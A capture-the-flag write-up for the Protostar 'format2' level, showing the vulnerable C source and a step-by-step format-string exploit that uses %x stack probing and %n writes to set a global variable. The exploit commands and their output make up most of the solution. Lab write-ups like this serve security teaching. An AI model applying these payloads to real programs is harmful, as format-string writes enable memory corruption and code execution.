# Format 2

This level moves on from format1 and shows how specific values can be written in memory.

This level is at `/opt/protostar/bin/format2`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

## Solution


First I wanted to find where we control the address:

```console
user@protostar:/opt/protostar/bin$ python -c 'print("AAAA" + "%x " * 100)' | ./format2 | tr ' ' '\n' | grep -n 4141
4:41414141
user@protostar:/opt/protostar/bin$ python -c 'print("AAAA" + "%x " * 4)' | ./format2 | tr ' ' '\n'
AAAA200
b7fd8420
bffff524
41414141

target
is
0
:(
```

Then I wanted to figure out how many characters I was writing:

```console
user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss  00000004              target
user@protostar:/opt/protostar/bin$ python -c 'print("\xe4\x96\x04\x08" + "%x " * 3 + "%n ")' | ./format2
200 b7fd8420 bffff524  
target is 26 :(
```

Weird, I cannot explain why I wrote 26 characters. I thought by doing something like this I will write 64 characters:

```console
user@protostar:/opt/protostar/bin$ python -c 'prefix = "\xe4\x96\x04\x08" + "%x " * 3; payload = "A" * (64 - len(prefix)); print(prefix + payload + "%n ")' | ./format2
200 b7fd8420 bffff524 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
target is 77 :(
```

Finally:

```console
user@protostar:/opt/protostar/bin$ python -c 'prefix = "\xe4\x96\x04\x08" + "%x " * 3; payload = "A" * (51 - len(prefix)); print(prefix + payload + "%n ")' | ./format2
200 b7fd8420 bffff524 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
you have modified the target :)
```

Or a simpler solution:

```console
user@protostar:/opt/protostar/bin$ python -c 'print("\xe4\x96\x04\x08" + "A" * 60 + "%4$n")' | ./format2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have modified the target :)

user@protostar:/opt/protostar/bin$ python -c 'print("\xe4\x96\x04\x08" + "%60d" + "%4$n")' | ./format2
                                                         512
you have modified the target :)
```

## Useful links

- <https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf>